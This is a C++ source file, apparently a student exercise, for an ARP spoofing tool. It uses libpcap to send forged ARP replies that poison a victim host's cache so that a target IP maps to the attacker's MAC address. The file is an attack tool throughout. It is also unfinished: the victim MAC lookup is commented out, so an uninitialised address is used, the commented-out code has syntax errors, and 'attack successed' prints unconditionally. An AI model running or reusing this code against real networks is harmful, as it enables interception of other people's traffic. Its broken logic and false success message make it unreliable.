#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <iostream>
#include <libnet.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
	//printf("syntax: send-arp-test <interface>\n");
	//printf("sample: send-arp-test wlan0\n");
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");

}

EthArpPacket packet;

//참조코드(MAC주소 가져오는 함수)
void getMacAddress(char * uc_Mac, char *iface){
	int fd;

	struct ifreq ifr;
	unsigned char *mac;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name , (const char *)iface , IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);

	mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;

	//display mac address
	sprintf((char *)uc_Mac,(const char *)"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

}


string getIpAddress(char* dev){
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0){
		perror("socket");
		return("Error");
	}

	char ip_address[INET_ADDRSTRLEN];
	//Ip ip_address;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	ifr.ifr_name[IFNAMSIZ]='\0';

	//get interface information
	if(ioctl(s, SIOCGIFADDR, &ifr) < 0){
		perror("ioctl");
		close(s);
		return("Error");
	}
	inet_ntop(AF_INET, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, ip_address, INET_ADDRSTRLEN);
	close(s);
	return (ip_address);
}

void sendArp(pcap_t* handle, Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip, int mode){
	//mode=1: reply, mode=0: request
	packet.eth_.smac_ = eth_smac;
	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (mode == 0)
		packet.arp_.op_ = htons(ArpHdr::Request);
	else if (mode == 1)
		packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0){
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

/*
//get Sender's Mac by Ip
int GetSenderMac(pcap_t* handle, Ip myIp, Mac myMac, Ip senderIp, Mac* senderMac) {

	//if fail to get sender mac address, return 1
	Mac broadcast = Mac("FF:FF:FF:FF:FF:FF".);
	Mac unknown = Mac("00:00:00:00:00:00");


    return 0;//successed to get sender mac
}
*/

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2){
		usage();
		return -1;
	}

	//print my(attacker's) Information(Mac, Ip)
	char myMac[32] = {0};
	string myIp;
	myIp = getIpAddress(argv[1]);
	getMacAddress(myMac, argv[1]);
	cout << "my Mac   Address : " << myMac;
	cout << "my IP    Address : " << myIp << endl;

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pcap_t* handle = pcap_open_live(dev,BUFSIZ, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac	senderMac;
	Ip	senderIp;
	Mac	targetMac;
	Ip	targetIp;

	for (int i = 0; i < argc-2; i += 2){
		senderIp = Ip(argv[2+i]);
		targetIp = Ip(argv[2+i+1]);

		cout << "sender Ip: " << string(senderIp) << endl;
		cout << "target Ip: " << string(targetIp) << endl;
	
		/*
		int sender_mac_err = getSenderMac(handle, myIp, myMac, senderIp, &senderMac);
		if (sender_mac_err) {
			cout << "can't find sender's Mac Address" << endl;
			pcap_close(handle);
			return 0;
		}*/


		//sendArpPacket
		sendArp(handle, myMac, senderMac, myMac, targetIp, senderMac, senderIp, 1);//mode: reply
		printf("attack successed\n");
		
		/*
		//sendArpPacket
		packet.eth_.dmac = senderMac;
		packet.eth_.smac = myMac;
		packet.eth_.type = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_pro_ = htons(EthHdr::Ip4);
		packet.arp_hln = Mac::SIZE;
		packet.arp_pln = IP::SIZE;
		packet.arp_op = htons(ArpHdr::Reply);//0: Request, 1: Reply

		packet.arp_.smac_ = myMac;
		packet.arp_.sip_ = htonl(targetIp);
		packet.arp_.tmac_ = senderMac;
		packet.arp_.tip_ = htonl(senderIp);


		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
		if (res != 0){
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		*/
	}	
	pcap_close(handle);
}
